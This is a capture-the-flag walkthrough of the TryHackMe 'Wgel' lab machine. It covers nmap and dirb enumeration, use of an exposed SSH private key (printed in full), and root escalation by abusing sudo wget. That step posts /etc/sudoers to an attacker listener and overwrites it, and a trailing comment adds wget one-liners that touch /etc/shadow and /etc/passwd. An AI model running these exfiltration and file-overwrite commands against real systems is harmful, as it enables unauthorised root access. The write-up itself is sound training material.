# Wgel

### Wgel is a TryHackMe Machine. It's an easy level Machine to demonstrate the basics of system hacking.TryHackMe Provides Almost Free Labs to study and practise pentesting and CTF based Skills needed for an offensive-based cyber practioner.

## Enumuration
Enumeration is the process of understadning our target. Here target has been provided by an IPv4 address.
### NMAP Scan

So we First use a Tool called NMap to scan the IP address. To know which services are running and what vulnerabilities it might hold.

### `nmap -T4 -A -v {IP Address}`

```python
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-25 00:34 India Standard Time
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 00:34
Completed NSE at 00:34, 0.00s elapsed
Initiating NSE at 00:34
Completed NSE at 00:34, 0.00s elapsed
Initiating NSE at 00:34
Completed NSE at 00:34, 0.00s elapsed
Initiating Ping Scan at 00:34
Scanning 10.10.3.112 [4 ports]
Completed Ping Scan at 00:34, 0.55s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 00:34
Completed Parallel DNS resolution of 1 host. at 00:34, 0.01s elapsed
Initiating SYN Stealth Scan at 00:34
Scanning 10.10.3.112 [1000 ports]
Discovered open port 80/tcp on 10.10.3.112
Discovered open port 22/tcp on 10.10.3.112
Completed SYN Stealth Scan at 00:34, 2.56s elapsed (1000 total ports)
Initiating Service scan at 00:34
Scanning 2 services on 10.10.3.112
Completed Service scan at 00:34, 6.42s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 10.10.3.112
Retrying OS detection (try #2) against 10.10.3.112
Retrying OS detection (try #3) against 10.10.3.112
Retrying OS detection (try #4) against 10.10.3.112
Retrying OS detection (try #5) against 10.10.3.112
Initiating Traceroute at 00:35
Completed Traceroute at 00:35, 0.18s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 00:35
Completed Parallel DNS resolution of 2 hosts. at 00:35, 0.01s elapsed
NSE: Script scanning 10.10.3.112.
Initiating NSE at 00:35
Completed NSE at 00:35, 6.56s elapsed
Initiating NSE at 00:35
Completed NSE at 00:35, 0.75s elapsed
Initiating NSE at 00:35
Completed NSE at 00:35, 0.00s elapsed
Nmap scan report for 10.10.3.112
Host is up (0.17s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
--------------------------TRUNCATED---------------------------
```

From the above results we find out majorly 2 Ports are active:

| Port No. | Service |
| -------- | ------- |
| 22       | SSH     |
| 80       | HTTP    |

So we use enumurate on port 80 as it hosts a website.
On opening the website we find it is hosting a default Apache UBUNTU server.
![](2021-06-25-00-59-19.png)

### Source Code Enum

After going through the source code of the page, we find:
![](2021-06-25-00-52-15.png)
#### Hmm, looks like we found that there is a user named 'Jessie'.

![](2021-06-25-01-12-12.png)


### DIRB enum

Here we use a tool called DIRB (Directory Buster).
It shows us Possible directory routes on this Portal.
#### DIRB returned some awesome data:
-----------------
```python
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Fri Jun 25 00:42:18 2021
URL_BASE: http://10.10.3.112/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://10.10.3.112/ ----
+ http://10.10.3.112/index.html (CODE:200|SIZE:11374)
+ http://10.10.3.112/server-status (CODE:403|SIZE:276)
==> DIRECTORY: http://10.10.3.112/sitemap/

---- Entering directory: http://10.10.3.112/sitemap/ ----
==> DIRECTORY: http://10.10.3.112/sitemap/.ssh/
==> DIRECTORY: http://10.10.3.112/sitemap/css/
==> DIRECTORY: http://10.10.3.112/sitemap/fonts/
==> DIRECTORY: http://10.10.3.112/sitemap/images/
+ http://10.10.3.112/sitemap/index.html (CODE:200|SIZE:21080)
==> DIRECTORY: http://10.10.3.112/sitemap/js/

---- Entering directory: http://10.10.3.112/sitemap/.ssh/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.3.112/sitemap/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.3.112/sitemap/fonts/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.3.112/sitemap/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.3.112/sitemap/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

-----------------
END_TIME: Fri Jun 25 01:12:03 2021
DOWNLOADED: 9224 - FOUND: 3
```
Looks like we have hit a Jackpot

`http://10.10.3.112/sitemap/.ssh/`

#### On browsing to that URL, we find a private RSA key for a user's SSH

```-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA2mujeBv3MEQFCel8yvjgDz066+8Gz0W72HJ5tvG8bj7Lz380
m+JYAquy30lSp5jH/bhcvYLsK+T9zEdzHmjKDtZN2cYgwHw0dDadSXWFf9W2gc3x
W69vjkHLJs+lQi0bEJvqpCZ1rFFSpV0OjVYRxQ4KfAawBsCG6lA7GO7vLZPRiKsP
y4lg2StXQYuZ0cUvx8UkhpgxWy/OO9ceMNondU61kyHafKobJP7Py5QnH7cP/psr
+J5M/fVBoKPcPXa71mA/ZUioimChBPV/i/0za0FzVuJZdnSPtS7LzPjYFqxnm/BH
Wo/Lmln4FLzLb1T31pOoTtTKuUQWxHf7cN8v6QIDAQABAoIBAFZDKpV2HgL+6iqG
/1U+Q2dhXFLv3PWhadXLKEzbXfsAbAfwCjwCgZXUb9mFoNI2Ic4PsPjbqyCO2LmE
AnAhHKQNeUOn3ymGJEU9iJMJigb5xZGwX0FBoUJCs9QJMBBZthWyLlJUKic7GvPa
M7QYKP51VCi1j3GrOd1ygFSRkP6jZpOpM33dG1/ubom7OWDZPDS9AjAOkYuJBobG
SUM+uxh7JJn8uM9J4NvQPkC10RIXFYECwNW+iHsB0CWlcF7CAZAbWLsJgd6TcGTv
2KBA6YcfGXN0b49CFOBMLBY/dcWpHu+d0KcruHTeTnM7aLdrexpiMJ3XHVQ4QRP2
p3xz9QECgYEA+VXndZU98FT+armRv8iwuCOAmN8p7tD1W9S2evJEA5uTCsDzmsDj
7pUO8zziTXgeDENrcz1uo0e3bL13MiZeFe9HQNMpVOX+vEaCZd6ZNFbJ4R889D7I
dcXDvkNRbw42ZWx8TawzwXFVhn8Rs9fMwPlbdVh9f9h7papfGN2FoeECgYEA4EIy
GW9eJnl0tzL31TpW2lnJ+KYCRIlucQUnBtQLWdTncUkm+LBS5Z6dGxEcwCrYY1fh
shl66KulTmE3G9nFPKezCwd7jFWmUUK0hX6Sog7VRQZw72cmp7lYb1KRQ9A0Nb97
uhgbVrK/Rm+uACIJ+YD57/ZuwuhnJPirXwdaXwkCgYBMkrxN2TK3f3LPFgST8K+N
LaIN0OOQ622e8TnFkmee8AV9lPp7eWfG2tJHk1gw0IXx4Da8oo466QiFBb74kN3u
QJkSaIdWAnh0G/dqD63fbBP95lkS7cEkokLWSNhWkffUuDeIpy0R6JuKfbXTFKBW
V35mEHIidDqtCyC/gzDKIQKBgDE+d+/b46nBK976oy9AY0gJRW+DTKYuI4FP51T5
hRCRzsyyios7dMiVPtxtsomEHwYZiybnr3SeFGuUr1w/Qq9iB8/ZMckMGbxoUGmr
9Jj/dtd0ZaI8XWGhMokncVyZwI044ftoRcCQ+a2G4oeG8ffG2ZtW2tWT4OpebIsu
eyq5AoGBANCkOaWnitoMTdWZ5d+WNNCqcztoNppuoMaG7L3smUSBz6k8J4p4yDPb
QNF1fedEOvsguMlpNgvcWVXGINgoOOUSJTxCRQFy/onH6X1T5OAAW6/UXc4S7Vsg
jL8g9yBg4vPB8dHC6JeJpFFE06vxQMFzn6vjEab9GhnpMihrSCod
-----END RSA PRIVATE KEY-----
```
## FootHold
So we will use PuttYGen to generate and connect us with the SSH

![](2021-06-25-11-53-27.png)

Save the above RSA Priv Key to a .ppk format and use 

`Load an existing private key file.`

And after that click on `Save Private key` .

After that open PuttY and Click Connection > SSH > Auth in the left navigation pane and configure the SSH private key to use by clicking Browse under Private key file for authentication.

Then Login using PuttY

With username Being:'jessie' we found before.

![](2021-06-25-12-01-49.png)

Going into Documents Folder we find the user_flag.txt

![](2021-06-25-12-34-19.png)


## Root Privilege Escalation

On Doing

```SH
    jessie@CorpOne:~$ sudo -l
    User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```
![](2021-06-25-17-38-41.png)

So We have sudo permissions for wget, I wonder what we can do.

* UPLOAD to attacker machine
* Download to attacker machine
* Re/Write Files on PWN machine
* Read Files on PWN machine

So we can directly upload /root/root_flag.txt to Our machine but thats not enough in real life.
So we will rewrite the `/etc/sudoers` file. This file is responsible for giving sudo-without-password permissions to various users and programs

Start a reverse shell listener on your attacking machine

```nc -lvnp 80```

And then we will write this

```SH
jessie@CorpOne:~$ sudo wget --post-file=/etc/sudoers {YOUR THM provided IP}
```

![](2021-06-25-17-44-11.png)

You will get this type of output on your attacking machine

```SH
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.135.145.
Ncat: Connection from 10.10.135.145:57690.
POST / HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: {YOUR THM provided IP}
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 797

#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d
jessie  ALL=(root) NOPASSWD: /usr/bin/wget
```

Save The Data To a `sudoer2` file.   
Edit out the `NOPASSWD: /usr/bin/wget` Portion to `NOPASSWD: ALL` using ONLY `VISUDO`

![](2021-06-25-17-49-30.png)

And download it back to victim machine

```SH
URL=http://{YOUR-IP alloted from THM}/sudoer2
LFILE=/etc/sudoers
sudo wget $URL -O $LFILE
```

```BASH
jessie@CorpOne:~$ sudo -i
root@CorpOne:~# ls -la
total 28
drwx------  4 root root 4096 oct 26  2019 .
drwxr-xr-x 23 root root 4096 oct 26  2019 ..
-rw-r--r--  1 root root 3106 oct 22  2015 .bashrc
drwx------  2 root root 4096 feb 27  2019 .cache
drwxr-xr-x  2 root root 4096 oct 26  2019 .nano
-rw-r--r--  1 root root  148 aug 17  2015 .profile
-rw-r--r--  1 root root   33 oct 26  2019 root_flag.txt
root@CorpOne:~# cat root_flag.txt
b1b968b37519ad1daa6408188649263d

```

# VOILA!!

<!-- URL=http://{YOUR THM provided IP}/sudoer2
LFILE=/etc/sudoers
sudo wget $URL -O $LFILE

LFILE=/etc/shadow
wget -i $LFILE

LFILE=/etc/passwd
TF=$(mktemp)
echo cat backuppaswd > $TF
wget -i $TF -o $LFILE -->